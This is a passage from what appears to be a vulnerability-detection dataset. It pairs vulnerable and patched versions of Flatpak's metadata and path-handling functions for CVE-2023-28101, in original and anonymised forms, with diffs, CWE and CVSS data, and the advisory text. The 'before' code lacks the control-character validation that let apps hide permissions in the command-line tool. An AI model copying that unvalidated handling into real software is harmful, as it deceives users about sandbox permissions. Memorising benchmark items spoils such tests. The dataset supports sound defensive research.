for (VAR_6 = 0; VAR_18[VAR_6] != NULL; VAR_6++)
{
FlatpakContextFeatures VAR_19 = flatpak_context_feature_from_string (parse_negated (VAR_18[VAR_6], &VAR_3), NULL);
if (VAR_19 == 0)
g_info (""Unknown feature type %s"", VAR_18[VAR_6]);
else
{
if (VAR_3)
flatpak_context_remove_features (VAR_0, VAR_19);
else
flatpak_context_add_features (VAR_0, VAR_19);
}
}
}
if (g_key_file_has_key (VAR_1, VAR_7, VAR_20, NULL))
{
VAR_4(GStrv) VAR_21 = g_key_file_get_string_list (VAR_1, VAR_7,
VAR_20, NULL, VAR_2);
if (VAR_21 == NULL)
return FALSE;
for (VAR_6 = 0; VAR_21[VAR_6] != NULL; VAR_6++)
{
const char *VAR_22 = parse_negated (VAR_21[VAR_6], &VAR_3);
g_autofree char *VAR_23 = NULL;
FlatpakFilesystemMode VAR_24;
if (!flatpak_context_parse_filesystem (VAR_22, VAR_3,
&VAR_23, &VAR_24, NULL))
g_info (""Unknown filesystem type %s"", VAR_21[VAR_6]);
else
{
g_assert (VAR_24 == VAR_25 || !VAR_3);
flatpak_context_take_filesystem (VAR_0, g_steal_pointer (&VAR_23), VAR_24);
}
}
}
if (g_key_file_has_key (VAR_1, VAR_7, VAR_26, NULL))
{
VAR_4(GStrv) VAR_27 = g_key_file_get_string_list (VAR_1, VAR_7,
VAR_26, NULL, VAR_2);
if (VAR_27 == NULL)
return FALSE;
for (VAR_6 = 0; VAR_27[VAR_6] != NULL; VAR_6++)
flatpak_context_set_persistent (VAR_0, VAR_27[VAR_6]);
}
if (g_key_file_has_group (VAR_1, VAR_28))
{
VAR_4(GStrv) VAR_29 = NULL;
gsize VAR_30;
VAR_29 = g_key_file_get_keys (VAR_1, VAR_28, &VAR_30, NULL);
for (VAR_6 = 0; VAR_6 < VAR_30; VAR_6++)
{
const char *VAR_31 = VAR_29[VAR_6];
g_autofree char *VAR_32 = g_key_file_get_string (VAR_1, VAR_28, VAR_31, NULL);
FlatpakPolicy VAR_33;
if (!flatpak_verify_dbus_name (VAR_31, VAR_2))
return FALSE;
VAR_33 = flatpak_policy_from_string (VAR_32, NULL);
if ((int) VAR_33 != -1)
flatpak_context_set_session_bus_policy (VAR_0, VAR_31, VAR_33);
}
}
if (g_key_file_has_group (VAR_1, VAR_34))
{
VAR_4(GStrv) VAR_29 = NULL;
gsize VAR_30;
VAR_29 = g_key_file_get_keys (VAR_1, VAR_34, &VAR_30, NULL);
for (VAR_6 = 0; VAR_6 < VAR_30; VAR_6++)
{
const char *VAR_31 = VAR_29[VAR_6];
g_autofree char *VAR_32 = g_key_file_get_string (VAR_1, VAR_34, VAR_31, NULL);
FlatpakPolicy VAR_33;
if (!flatpak_verify_dbus_name (VAR_31, VAR_2))
return FALSE;
VAR_33 = flatpak_policy_from_string (VAR_32, NULL);
if ((int) VAR_33 != -1)
flatpak_context_set_system_bus_policy (VAR_0, VAR_31, VAR_33);
}
}
if (g_key_file_has_group (VAR_1, VAR_35))
{
VAR_4(GStrv) VAR_29 = NULL;
gsize VAR_30;
VAR_29 = g_key_file_get_keys (VAR_1, VAR_35, &VAR_30, NULL);
for (VAR_6 = 0; VAR_6 < VAR_30; VAR_6++)
{
const char *VAR_31 = VAR_29[VAR_6];
g_autofree char *VAR_32 = g_key_file_get_string (VAR_1, VAR_35, VAR_31, NULL);
flatpak_context_set_env_var (VAR_0, VAR_31, VAR_32);
}
}
if (g_key_file_has_key (VAR_1, VAR_7, VAR_36, NULL))
{
VAR_4(GStrv) VAR_37 = NULL;
gsize VAR_38;
VAR_37 = g_key_file_get_string_list (VAR_1, VAR_7,
VAR_36,
&VAR_38, VAR_2);
if (VAR_37 == NULL)
return FALSE;
for (VAR_6 = 0; VAR_6 < VAR_38; VAR_6++)
{
const char *VAR_39 = VAR_37[VAR_6];
flatpak_context_set_env_var (VAR_0, VAR_39, NULL);
}
}
VAR_5 = g_key_file_get_groups (VAR_1, NULL);
for (VAR_6 = 0; VAR_5[VAR_6] != NULL; VAR_6++)
{
const char *VAR_40 = VAR_5[VAR_6];
const char *VAR_41;
int VAR_42;
if (g_str_has_prefix (VAR_40, VAR_43))
{
VAR_4(GStrv) VAR_29 = NULL;
VAR_41 = VAR_40 + strlen (VAR_43);
VAR_29 = g_key_file_get_keys (VAR_1, VAR_40, NULL, NULL);
for (VAR_42 = 0; VAR_29 != NULL && VAR_29[VAR_42] != NULL; VAR_42++)
{
const char *VAR_31 = VAR_29[VAR_42];
g_autofree char *VAR_44 = g_strdup_printf (""%s.%s"", VAR_41, VAR_31);
VAR_4(GStrv) VAR_45 = NULL;
int VAR_46;
VAR_45 = g_key_file_get_string_list (VAR_1, VAR_40, VAR_31, NULL, NULL);
for (VAR_46 = 0; VAR_45 != NULL && VAR_45[VAR_46] != NULL; VAR_46++)
flatpak_context_apply_generic_policy (VAR_0, VAR_44,
VAR_45[VAR_46]);
}
}
}
return TRUE;
}",flatpak/7fe63f2e8f1fd2dafc31d45154cf0b191ebec66c/flatpak-context.c/vul/before/1.json,"gboolean
flatpak_context_load_metadata (FlatpakContext *context,
                               GKeyFile       *metakey,
                               GError        **error)
{
  gboolean remove;
  g_auto(GStrv) groups = NULL;
  gsize i;

  if (g_key_file_has_key (metakey, FLATPAK_METADATA_GROUP_CONTEXT, FLATPAK_METADATA_KEY_SHARED, NULL))
    {
      g_auto(GStrv) shares = g_key_file_get_string_list (metakey, FLATPAK_METADATA_GROUP_CONTEXT,
                                                         FLATPAK_METADATA_KEY_SHARED, NULL, error);
      if (shares == NULL)
        return FALSE;

      for (i = 0; shares[i] != NULL; i++)
        {
          FlatpakContextShares share;

          share = flatpak_context_share_from_string (parse_negated (shares[i], &remove), NULL);
          if (share == 0)
            g_info (""Unknown share type %s"", shares[i]);
          else
            {
              if (remove)
                flatpak_context_remove_shares (context, share);
              else
                flatpak_context_add_shares (context, share);
            }
        }
    }

  if (g_key_file_has_key (metakey, FLATPAK_METADATA_GROUP_CONTEXT, FLATPAK_METADATA_KEY_SOCKETS, NULL))
    {
      g_auto(GStrv) sockets = g_key_file_get_string_list (metakey, FLATPAK_METADATA_GROUP_CONTEXT,
                                                          FLATPAK_METADATA_KEY_SOCKETS, NULL, error);
      if (sockets == NULL)
        return FALSE;

      for (i = 0; sockets[i] != NULL; i++)
        {
          FlatpakContextSockets socket = flatpak_context_socket_from_string (parse_negated (sockets[i], &remove), NULL);
          if (socket == 0)
            g_info (""Unknown socket type %s"", sockets[i]);
          else
            {
              if (remove)
                flatpak_context_remove_sockets (context, socket);
              else
                flatpak_context_add_sockets (context, socket);
            }
        }
    }

  if (g_key_file_has_key (metakey, FLATPAK_METADATA_GROUP_CONTEXT, FLATPAK_METADATA_KEY_DEVICES, NULL))
    {
      g_auto(GStrv) devices = g_key_file_get_string_list (metakey, FLATPAK_METADATA_GROUP_CONTEXT,
                                                          FLATPAK_METADATA_KEY_DEVICES, NULL, error);
      if (devices == NULL)
        return FALSE;


      for (i = 0; devices[i] != NULL; i++)
        {
          FlatpakContextDevices device = flatpak_context_device_from_string (parse_negated (devices[i], &remove), NULL);
          if (device == 0)
            g_info (""Unknown device type %s"", devices[i]);
          else
            {
              if (remove)
                flatpak_context_remove_devices (context, device);
              else
                flatpak_context_add_devices (context, device);
            }
        }
    }

  if (g_key_file_has_key (metakey, FLATPAK_METADATA_GROUP_CONTEXT, FLATPAK_METADATA_KEY_FEATURES, NULL))
    {
      g_auto(GStrv) features = g_key_file_get_string_list (metakey, FLATPAK_METADATA_GROUP_CONTEXT,
                                                           FLATPAK_METADATA_KEY_FEATURES, NULL, error);
      if (features == NULL)
        return FALSE;


      for (i = 0; features[i] != NULL; i++)
        {
          FlatpakContextFeatures feature = flatpak_context_feature_from_string (parse_negated (features[i], &remove), NULL);
          if (feature == 0)
            g_info (""Unknown feature type %s"", features[i]);
          else
            {
              if (remove)
                flatpak_context_remove_features (context, feature);
              else
                flatpak_context_add_features (context, feature);
            }
        }
    }

  if (g_key_file_has_key (metakey, FLATPAK_METADATA_GROUP_CONTEXT, FLATPAK_METADATA_KEY_FILESYSTEMS, NULL))
    {
      g_auto(GStrv) filesystems = g_key_file_get_string_list (metakey, FLATPAK_METADATA_GROUP_CONTEXT,
                                                              FLATPAK_METADATA_KEY_FILESYSTEMS, NULL, error);
      if (filesystems == NULL)
        return FALSE;

      for (i = 0; filesystems[i] != NULL; i++)
        {
          const char *fs = parse_negated (filesystems[i], &remove);
          g_autofree char *filesystem = NULL;
          g_autoptr(GError) local_error = NULL;
          FlatpakFilesystemMode mode;

          if (!flatpak_context_parse_filesystem (fs, remove,
                                                 &filesystem, &mode, &local_error))
            {
              if (g_error_matches (local_error, G_IO_ERROR, G_IO_ERROR_INVALID_DATA))
                {
                  /* Invalid characters, so just hard-fail. */
                  g_propagate_error (error, g_steal_pointer (&local_error));
                  return FALSE;
                }
              else
                {
                  g_info (""Unknown filesystem type %s"", filesystems[i]);
                  g_clear_error (&local_error);
                }
            }
          else
            {
              g_assert (mode == FLATPAK_FILESYSTEM_MODE_NONE || !remove);
              flatpak_context_take_filesystem (context, g_steal_pointer (&filesystem), mode);
            }
        }
    }

  if (g_key_file_has_key (metakey, FLATPAK_METADATA_GROUP_CONTEXT, FLATPAK_METADATA_KEY_PERSISTENT, NULL))
    {
      g_auto(GStrv) persistent = g_key_file_get_string_list (metakey, FLATPAK_METADATA_GROUP_CONTEXT,
                                                             FLATPAK_METADATA_KEY_PERSISTENT, NULL, error);
      if (persistent == NULL)
        return FALSE;

      for (i = 0; persistent[i] != NULL; i++)
        if (!flatpak_context_set_persistent (context, persistent[i], error))
          return FALSE;
    }

  if (g_key_file_has_group (metakey, FLATPAK_METADATA_GROUP_SESSION_BUS_POLICY))
    {
      g_auto(GStrv) keys = NULL;
      gsize keys_count;

      keys = g_key_file_get_keys (metakey, FLATPAK_METADATA_GROUP_SESSION_BUS_POLICY, &keys_count, NULL);
      for (i = 0; i < keys_count; i++)
        {
          const char *key = keys[i];
          g_autofree char *value = g_key_file_get_string (metakey, FLATPAK_METADATA_GROUP_SESSION_BUS_POLICY, key, NULL);
          FlatpakPolicy policy;

          if (!flatpak_verify_dbus_name (key, error))
            return FALSE;

          policy = flatpak_policy_from_string (value, NULL);
          if ((int) policy != -1)
            flatpak_context_set_session_bus_policy (context, key, policy);
        }
    }

  if (g_key_file_has_group (metakey, FLATPAK_METADATA_GROUP_SYSTEM_BUS_POLICY))
    {
      g_auto(GStrv) keys = NULL;
      gsize keys_count;

      keys = g_key_file_get_keys (metakey, FLATPAK_METADATA_GROUP_SYSTEM_BUS_POLICY, &keys_count, NULL);
      for (i = 0; i < keys_count; i++)
        {
          const char *key = keys[i];
          g_autofree char *value = g_key_file_get_string (metakey, FLATPAK_METADATA_GROUP_SYSTEM_BUS_POLICY, key, NULL);
          FlatpakPolicy policy;

          if (!flatpak_verify_dbus_name (key, error))
            return FALSE;

          policy = flatpak_policy_from_string (value, NULL);
          if ((int) policy != -1)
            flatpak_context_set_system_bus_policy (context, key, policy);
        }
    }

  if (g_key_file_has_group (metakey, FLATPAK_METADATA_GROUP_ENVIRONMENT))
    {
      g_auto(GStrv) keys = NULL;
      gsize keys_count;

      keys = g_key_file_get_keys (metakey, FLATPAK_METADATA_GROUP_ENVIRONMENT, &keys_count, NULL);
      for (i = 0; i < keys_count; i++)
        {
          const char *key = keys[i];
          g_autofree char *value = g_key_file_get_string (metakey, FLATPAK_METADATA_GROUP_ENVIRONMENT, key, NULL);

          flatpak_context_set_env_var (context, key, value);
        }
    }

  /* unset-environment is higher precedence than Environment, so that
   * we can put unset keys in both places. Old versions of Flatpak will
   * interpret the empty string as unset; new versions will obey
   * unset-environment. */
  if (g_key_file_has_key (metakey, FLATPAK_METADATA_GROUP_CONTEXT, FLATPAK_METADATA_KEY_UNSET_ENVIRONMENT, NULL))
    {
      g_auto(GStrv) vars = NULL;
      gsize vars_count;

      vars = g_key_file_get_string_list (metakey, FLATPAK_METADATA_GROUP_CONTEXT,
                                         FLATPAK_METADATA_KEY_UNSET_ENVIRONMENT,
                                         &vars_count, error);

      if (vars == NULL)
        return FALSE;

      for (i = 0; i < vars_count; i++)
        {
          const char *var = vars[i];

          flatpak_context_set_env_var (context, var, NULL);
        }
    }

  groups = g_key_file_get_groups (metakey, NULL);
  for (i = 0; groups[i] != NULL; i++)
    {
      const char *group = groups[i];
      const char *subsystem;
      int j;

      if (g_str_has_prefix (group, FLATPAK_METADATA_GROUP_PREFIX_POLICY))
        {
          g_auto(GStrv) keys = NULL;
          subsystem = group + strlen (FLATPAK_METADATA_GROUP_PREFIX_POLICY);
          keys = g_key_file_get_keys (metakey, group, NULL, NULL);
          for (j = 0; keys != NULL && keys[j] != NULL; j++)
            {
              const char *key = keys[j];
              g_autofree char *policy_key = g_strdup_printf (""%s.%s"", subsystem, key);
              g_auto(GStrv) values = NULL;
              int k;

              values = g_key_file_get_string_list (metakey, group, key, NULL, NULL);
              for (k = 0; values != NULL && values[k] != NULL; k++)
                flatpak_context_apply_generic_policy (context, policy_key,
                                                      values[k]);
            }
        }
    }

  return TRUE;
}","gboolean
flatpak_context_load_metadata (FlatpakContext *VAR_0,
                               GKeyFile       *VAR_1,
                               GError        **VAR_2)
{
  gboolean VAR_3;
  VAR_4(GStrv) VAR_5 = NULL;
  gsize VAR_6;

  if (g_key_file_has_key (VAR_1, VAR_7, VAR_8, NULL))
    {
      VAR_4(GStrv) VAR_9 = g_key_file_get_string_list (VAR_1, VAR_7,
                                                         VAR_8, NULL, VAR_2);
      if (VAR_9 == NULL)
        return FALSE;

      for (VAR_6 = 0; VAR_9[VAR_6] != NULL; VAR_6++)
        {
          FlatpakContextShares VAR_10;

          VAR_10 = flatpak_context_share_from_string (parse_negated (VAR_9[VAR_6], &VAR_3), NULL);
          if (VAR_10 == 0)
            g_info (""Unknown share type %s"", VAR_9[VAR_6]);
          else
            {
              if (VAR_3)
                flatpak_context_remove_shares (VAR_0, VAR_10);
              else
                flatpak_context_add_shares (VAR_0, VAR_10);
            }
        }
    }

  if (g_key_file_has_key (VAR_1, VAR_7, VAR_11, NULL))
    {
      VAR_4(GStrv) VAR_12 = g_key_file_get_string_list (VAR_1, VAR_7,
                                                          VAR_11, NULL, VAR_2);
      if (VAR_12 == NULL)
        return FALSE;

      for (VAR_6 = 0; VAR_12[VAR_6] != NULL; VAR_6++)
        {
          FlatpakContextSockets VAR_13 = flatpak_context_socket_from_string (parse_negated (VAR_12[VAR_6], &VAR_3), NULL);
          if (VAR_13 == 0)
            g_info (""Unknown socket type %s"", VAR_12[VAR_6]);
          else
            {
              if (VAR_3)
                flatpak_context_remove_sockets (VAR_0, VAR_13);
              else
                flatpak_context_add_sockets (VAR_0, VAR_13);
            }
        }
    }

  if (g_key_file_has_key (VAR_1, VAR_7, VAR_14, NULL))
    {
      VAR_4(GStrv) VAR_15 = g_key_file_get_string_list (VAR_1, VAR_7,
                                                          VAR_14, NULL, VAR_2);
      if (VAR_15 == NULL)
        return FALSE;


      for (VAR_6 = 0; VAR_15[VAR_6] != NULL; VAR_6++)
        {
          FlatpakContextDevices VAR_16 = flatpak_context_device_from_string (parse_negated (VAR_15[VAR_6], &VAR_3), NULL);
          if (VAR_16 == 0)
            g_info (""Unknown device type %s"", VAR_15[VAR_6]);
          else
            {
              if (VAR_3)
                flatpak_context_remove_devices (VAR_0, VAR_16);
              else
                flatpak_context_add_devices (VAR_0, VAR_16);
            }
        }
    }

  if (g_key_file_has_key (VAR_1, VAR_7, VAR_17, NULL))
    {
      VAR_4(GStrv) VAR_18 = g_key_file_get_string_list (VAR_1, VAR_7,
                                                           VAR_17, NULL, VAR_2);
      if (VAR_18 == NULL)
        return FALSE;


      for (VAR_6 = 0; VAR_18[VAR_6] != NULL; VAR_6++)
        {
          FlatpakContextFeatures VAR_19 = flatpak_context_feature_from_string (parse_negated (VAR_18[VAR_6], &VAR_3), NULL);
          if (VAR_19 == 0)
            g_info (""Unknown feature type %s"", VAR_18[VAR_6]);
          else
            {
              if (VAR_3)
                flatpak_context_remove_features (VAR_0, VAR_19);
              else
                flatpak_context_add_features (VAR_0, VAR_19);
            }
        }
    }

  if (g_key_file_has_key (VAR_1, VAR_7, VAR_20, NULL))
    {
      VAR_4(GStrv) VAR_21 = g_key_file_get_string_list (VAR_1, VAR_7,
                                                              VAR_20, NULL, VAR_2);
      if (VAR_21 == NULL)
        return FALSE;

      for (VAR_6 = 0; VAR_21[VAR_6] != NULL; VAR_6++)
        {
          const char *VAR_22 = parse_negated (VAR_21[VAR_6], &VAR_3);
          g_autofree char *VAR_23 = NULL;
          VAR_24(GError) VAR_25 = NULL;
          FlatpakFilesystemMode VAR_26;

          if (!flatpak_context_parse_filesystem (VAR_22, VAR_3,
                                                 &VAR_23, &VAR_26, &VAR_25))
            {
              if (g_error_matches (VAR_25, VAR_27, VAR_28))
                {
                  /* COMMENT_0 */
                  g_propagate_error (VAR_2, g_steal_pointer (&VAR_25));
                  return FALSE;
                }
              else
                {
                  g_info (""Unknown filesystem type %s"", VAR_21[VAR_6]);
                  g_clear_error (&VAR_25);
                }
            }
          else
            {
              g_assert (VAR_26 == VAR_29 || !VAR_3);
              flatpak_context_take_filesystem (VAR_0, g_steal_pointer (&VAR_23), VAR_26);
            }
        }
    }

  if (g_key_file_has_key (VAR_1, VAR_7, VAR_30, NULL))
    {
      VAR_4(GStrv) VAR_31 = g_key_file_get_string_list (VAR_1, VAR_7,
                                                             VAR_30, NULL, VAR_2);
      if (VAR_31 == NULL)
        return FALSE;

      for (VAR_6 = 0; VAR_31[VAR_6] != NULL; VAR_6++)
        if (!flatpak_context_set_persistent (VAR_0, VAR_31[VAR_6], VAR_2))
          return FALSE;
    }

  if (g_key_file_has_group (VAR_1, VAR_32))
    {
      VAR_4(GStrv) VAR_33 = NULL;
      gsize VAR_34;

      VAR_33 = g_key_file_get_keys (VAR_1, VAR_32, &VAR_34, NULL);
      for (VAR_6 = 0; VAR_6 < VAR_34; VAR_6++)
        {
          const char *VAR_35 = VAR_33[VAR_6];
          g_autofree char *VAR_36 = g_key_file_get_string (VAR_1, VAR_32, VAR_35, NULL);
          FlatpakPolicy VAR_37;

          if (!flatpak_verify_dbus_name (VAR_35, VAR_2))
            return FALSE;

          VAR_37 = flatpak_policy_from_string (VAR_36, NULL);
          if ((int) VAR_37 != -1)
            flatpak_context_set_session_bus_policy (VAR_0, VAR_35, VAR_37);
        }
    }

  if (g_key_file_has_group (VAR_1, VAR_38))
    {
      VAR_4(GStrv) VAR_33 = NULL;
      gsize VAR_34;

      VAR_33 = g_key_file_get_keys (VAR_1, VAR_38, &VAR_34, NULL);
      for (VAR_6 = 0; VAR_6 < VAR_34; VAR_6++)
        {
          const char *VAR_35 = VAR_33[VAR_6];
          g_autofree char *VAR_36 = g_key_file_get_string (VAR_1, VAR_38, VAR_35, NULL);
          FlatpakPolicy VAR_37;

          if (!flatpak_verify_dbus_name (VAR_35, VAR_2))
            return FALSE;

          VAR_37 = flatpak_policy_from_string (VAR_36, NULL);
          if ((int) VAR_37 != -1)
            flatpak_context_set_system_bus_policy (VAR_0, VAR_35, VAR_37);
        }
    }

  if (g_key_file_has_group (VAR_1, VAR_39))
    {
      VAR_4(GStrv) VAR_33 = NULL;
      gsize VAR_34;

      VAR_33 = g_key_file_get_keys (VAR_1, VAR_39, &VAR_34, NULL);
      for (VAR_6 = 0; VAR_6 < VAR_34; VAR_6++)
        {
          const char *VAR_35 = VAR_33[VAR_6];
          g_autofree char *VAR_36 = g_key_file_get_string (VAR_1, VAR_39, VAR_35, NULL);

          flatpak_context_set_env_var (VAR_0, VAR_35, VAR_36);
        }
    }

  /* COMMENT_1 */
                                                                       
                                                                
                          
  if (g_key_file_has_key (VAR_1, VAR_7, VAR_40, NULL))
    {
      VAR_4(GStrv) VAR_41 = NULL;
      gsize VAR_42;

      VAR_41 = g_key_file_get_string_list (VAR_1, VAR_7,
                                         VAR_40,
                                         &VAR_42, VAR_2);

      if (VAR_41 == NULL)
        return FALSE;

      for (VAR_6 = 0; VAR_6 < VAR_42; VAR_6++)
        {
          const char *VAR_43 = VAR_41[VAR_6];

          flatpak_context_set_env_var (VAR_0, VAR_43, NULL);
        }
    }

  VAR_5 = g_key_file_get_groups (VAR_1, NULL);
  for (VAR_6 = 0; VAR_5[VAR_6] != NULL; VAR_6++)
    {
      const char *VAR_44 = VAR_5[VAR_6];
      const char *VAR_45;
      int VAR_46;

      if (g_str_has_prefix (VAR_44, VAR_47))
        {
          VAR_4(GStrv) VAR_33 = NULL;
          VAR_45 = VAR_44 + strlen (VAR_47);
          VAR_33 = g_key_file_get_keys (VAR_1, VAR_44, NULL, NULL);
          for (VAR_46 = 0; VAR_33 != NULL && VAR_33[VAR_46] != NULL; VAR_46++)
            {
              const char *VAR_35 = VAR_33[VAR_46];
              g_autofree char *VAR_48 = g_strdup_printf (""%s.%s"", VAR_45, VAR_35);
              VAR_4(GStrv) VAR_49 = NULL;
              int VAR_50;

              VAR_49 = g_key_file_get_string_list (VAR_1, VAR_44, VAR_35, NULL, NULL);
              for (VAR_50 = 0; VAR_49 != NULL && VAR_49[VAR_50] != NULL; VAR_50++)
                flatpak_context_apply_generic_policy (VAR_0, VAR_48,
                                                      VAR_49[VAR_50]);
            }
        }
    }

  return TRUE;
}",flatpak/7fe63f2e8f1fd2dafc31d45154cf0b191ebec66c/flatpak-context.c/vul/after/1.json,"--- func_before
+++ func_after
@@ -110,11 +110,24 @@
         {
           const char *fs = parse_negated (filesystems[i], &remove);
           g_autofree char *filesystem = NULL;
+          g_autoptr(GError) local_error = NULL;
           FlatpakFilesystemMode mode;
 
           if (!flatpak_context_parse_filesystem (fs, remove,
-                                                 &filesystem, &mode, NULL))
-            g_info (""Unknown filesystem type %s"", filesystems[i]);
+                                                 &filesystem, &mode, &local_error))
+            {
+              if (g_error_matches (local_error, G_IO_ERROR, G_IO_ERROR_INVALID_DATA))
+                {
+                  /* Invalid characters, so just hard-fail. */
+                  g_propagate_error (error, g_steal_pointer (&local_error));
+                  return FALSE;
+                }
+              else
+                {
+                  g_info (""Unknown filesystem type %s"", filesystems[i]);
+                  g_clear_error (&local_error);
+                }
+            }
           else
             {
               g_assert (mode == FLATPAK_FILESYSTEM_MODE_NONE || !remove);
@@ -131,7 +144,8 @@
         return FALSE;
 
       for (i = 0; persistent[i] != NULL; i++)
-        flatpak_context_set_persistent (context, persistent[i]);
+        if (!flatpak_context_set_persistent (context, persistent[i], error))
+          return FALSE;
     }
 
   if (g_key_file_has_group (metakey, FLATPAK_METADATA_GROUP_SESSION_BUS_POLICY))","{'deleted_lines': ['                                                 &filesystem, &mode, NULL))', '            g_info (""Unknown filesystem type %s"", filesystems[i]);', '        flatpak_context_set_persistent (context, persistent[i]);'], 'added_lines': ['          g_autoptr(GError) local_error = NULL;', '                                                 &filesystem, &mode, &local_error))', '            {', '              if (g_error_matches (local_error, G_IO_ERROR, G_IO_ERROR_INVALID_DATA))', '                {', '                  /* Invalid characters, so just hard-fail. */', '                  g_propagate_error (error, g_steal_pointer (&local_error));', '                  return FALSE;', '                }', '              else', '                {', '                  g_info (""Unknown filesystem type %s"", filesystems[i]);', '                  g_clear_error (&local_error);', '                }', '            }', '        if (!flatpak_context_set_persistent (context, persistent[i], error))', '          return FALSE;']}",True,"Flatpak is a system for building, distributing, and running sandboxed desktop applications on Linux. In versions prior to 1.10.8, 1.12.8, 1.14.4, and 1.15.4, if an attacker publishes a Flatpak app with elevated permissions, they can hide those permissions from users of the `flatpak(1)` command-line interface by setting other permissions to crafted values that contain non-printable control characters such as `ESC`. A fix is available in versions 1.10.8, 1.12.8, 1.14.4, and 1.15.4. As a workaround, use a GUI like GNOME Software rather than the command-line interface, or only install apps whose maintainers you trust.",5.0,MEDIUM,1,valid,2023-03-05T03:07:03Z,4
CVE-2023-28101,['CWE-116'],CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N,1,flatpak,"Reject paths given to --filesystem/--persist with special characters

There isn't much in the way of legit reasons for this, but it's a
potential security footgun when displaying the text.

CVE-2023-28101, GHSA-h43h-fwqx-mpp8

Signed-off-by: Ryan Gonzalez <ryan.gonzalez@collabora.com>
Co-authored-by: Simon McVittie <smcv@collabora.com>",7fe63f2e8f1fd2dafc31d45154cf0b191ebec66c,https://github.com/flatpak/flatpak/commit/7fe63f2e8f1fd2dafc31d45154cf0b191ebec66c,common/flatpak-context.c,option_persist_cb,"static gboolean
option_persist_cb (const gchar *option_name,
const gchar *value,
gpointer     data,
GError     **error)
{
FlatpakContext *context = data;
flatpak_context_set_persistent (context, value);
return TRUE;
}","static gboolean
option_persist_cb (const gchar *VAR_0,
const gchar *VAR_1,
gpointer     VAR_2,
GError     **VAR_3)
{
FlatpakContext *VAR_4 = VAR_2;
flatpak_context_set_persistent (VAR_4, VAR_1);
return TRUE;
}",flatpak/7fe63f2e8f1fd2dafc31d45154cf0b191ebec66c/flatpak-context.c/vul/before/0.json,"static gboolean
option_persist_cb (const gchar *option_name,
                   const gchar *value,
                   gpointer     data,
                   GError     **error)
{
  FlatpakContext *context = data;

  return flatpak_context_set_persistent (context, value, error);
}","static gboolean
option_persist_cb (const gchar *VAR_0,
                   const gchar *VAR_1,
                   gpointer     VAR_2,
                   GError     **VAR_3)
{
  FlatpakContext *VAR_4 = VAR_2;

  return flatpak_context_set_persistent (VAR_4, VAR_1, VAR_3);
}",flatpak/7fe63f2e8f1fd2dafc31d45154cf0b191ebec66c/flatpak-context.c/vul/after/0.json,"--- func_before
+++ func_after
@@ -6,6 +6,5 @@
 {
   FlatpakContext *context = data;
 
-  flatpak_context_set_persistent (context, value);
-  return TRUE;
+  return flatpak_context_set_persistent (context, value, error);
 }","{'deleted_lines': ['  flatpak_context_set_persistent (context, value);', '  return TRUE;'], 'added_lines': ['  return flatpak_context_set_persistent (context, value, error);']}",True,"Flatpak is a system for building, distributing, and running sandboxed desktop applications on Linux. In versions prior to 1.10.8, 1.12.8, 1.14.4, and 1.15.4, if an attacker publishes a Flatpak app with elevated permissions, they can hide those permissions from users of the `flatpak(1)` command-line interface by setting other permissions to crafted values that contain non-printable control characters such as `ESC`. A fix is available in versions 1.10.8, 1.12.8, 1.14.4, and 1.15.4. As a workaround, use a GUI like GNOME Software rather than the command-line interface, or only install apps whose maintainers you trust.",5.0,MEDIUM,1,valid,2023-03-05T03:07:03Z,4
CVE-2023-28101,['CWE-116'],CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N,1,flatpak,"Reject paths given to --filesystem/--persist with special characters

There isn't much in the way of legit reasons for this, but it's a
potential security footgun when displaying the text.

CVE-2023-28101, GHSA-h43h-fwqx-mpp8

Signed-off-by: Ryan Gonzalez <ryan.gonzalez@collabora.com>
Co-authored-by: Simon McVittie <smcv@collabora.com>",7fe63f2e8f1fd2dafc31d45154cf0b191ebec66c,https://github.com/flatpak/flatpak/commit/7fe63f2e8f1fd2dafc31d45154cf0b191ebec66c,common/flatpak-context.c,flatpak_context_set_persistent,"static void
flatpak_context_set_persistent (FlatpakContext *context,
const char     *path)
{
g_hash_table_insert (context->persistent, g_strdup (path), GINT_TO_POINTER (1));
}","static void
flatpak_context_set_persistent (FlatpakContext *VAR_0,
const char     *VAR_1)
{
g_hash_table_insert (VAR_0->persistent, g_strdup (VAR_1), GINT_TO_POINTER (1));
}",flatpak/7fe63f2e8f1fd2dafc31d45154cf0b191ebec66c/flatpak-context.c/vul/before/2.json,"static gboolean
flatpak_context_set_persistent (FlatpakContext *context,
                                const char     *path,
                                GError        **error)
{
  if (!flatpak_validate_path_characters (path, error))
    return FALSE;

  g_hash_table_insert (context->persistent, g_strdup (path), GINT_TO_POINTER (1));
  return TRUE;
}","static gboolean
flatpak_context_set_persistent (FlatpakContext *VAR_0,
                                const char     *VAR_1,
                                GError        **VAR_2)
{
  if (!flatpak_validate_path_characters (VAR_1, VAR_2))
    return FALSE;

  g_hash_table_insert (VAR_0->persistent, g_strdup (VAR_1), GINT_TO_POINTER (1));
  return TRUE;
}",flatpak/7fe63f2e8f1fd2dafc31d45154cf0b191ebec66c/flatpak-context.c/vul/after/2.json,"--- func_before
+++ func_after
@@ -1,6 +1,11 @@
-static void
+static gboolean
 flatpak_context_set_persistent (FlatpakContext *context,
-                                const char     *path)
+                                const char     *path,
+                                GError        **error)
 {
+  if (!flatpak_validate_path_characters (path, error))
+    return FALSE;
+
   g_hash_table_insert (context->persistent, g_strdup (path), GINT_TO_POINTER (1));
+  return TRUE;
 }","{'deleted_lines': ['static void', '                                const char     *path)'], 'added_lines': ['static gboolean', '                                const char     *path,', '                                GError        **error)', '  if (!flatpak_validate_path_characters (path, error))', '    return FALSE;', '', '  return TRUE;']}",True,"Flatpak is a system for building, distributing, and running sandboxed desktop applications on Linux. In versions prior to 1.10.8, 1.12.8, 1.14.4, and 1.15.4, if an attacker publishes a Flatpak app with elevated permissions, they can hide those permissions from users of the `flatpak(1)` command-line interface by setting other permissions to crafted values that contain non-printable control characters such as `ESC`. A fix is available in versions 1.10.8, 1.12.8, 1.14.4, and 1.15.4. As a workaround, use a GUI like GNOME Software rather than the command-line interface, or only install apps whose maintainers you trust.",5.0,MEDIUM,1,valid,2023-03-05T03:07:03Z,4
CVE-2023-28101,['CWE-116'],CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N,1,flatpak,"Reject paths given to --filesystem/--persist with special characters

There isn't much in the way of legit reasons for this, but it's a
potential security footgun when displaying the text.

CVE-2023-28101, GHSA-h43h-fwqx-mpp8

Signed-off-by: Ryan Gonzalez <ryan.gonzalez@collabora.com>
